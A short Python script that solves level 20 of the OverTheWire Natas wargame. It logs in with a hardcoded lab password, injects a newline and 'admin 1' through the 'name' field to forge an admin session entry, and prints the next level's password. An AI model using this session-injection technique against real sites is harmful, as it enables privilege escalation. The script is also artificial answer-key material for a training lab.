
import requests

auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

data = {"name": "\nadmin  1"}

req = requests.post("http://natas20.natas.labs.overthewire.org/index.php",
                    data=data, auth=auth)
session_ID = req.cookies.get_dict()

s = requests.Session()
s.auth = auth
req = s.get("http://natas20.natas.labs.overthewire.org/index.php",
            cookies=session_ID, auth=auth)

results = req.text.split()
print(results[results.index("Password:") + 1])
